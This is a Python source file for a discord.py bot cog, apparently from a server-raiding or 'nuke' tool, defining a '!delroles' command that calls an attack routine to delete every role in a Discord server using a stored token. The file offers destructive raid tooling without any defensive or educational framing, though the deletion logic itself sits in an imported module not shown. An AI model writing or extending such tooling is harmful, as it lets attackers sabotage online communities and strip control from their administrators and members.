"""!delroles - delete every role."""

import discord
from discord.ext import commands

from core import attacks
from .common import run_attack, token


class DelRoles(commands.Cog):
    """delete every role."""

    @commands.command(name="delroles")
    async def delroles(self, ctx: commands.Context):
        """delete every role."""
        await run_attack(
            ctx, "Delete Roles",
            lambda g: attacks.delete_roles(token(), g.id))


async def setup(bot: commands.Bot):
    await bot.add_cog(DelRoles())
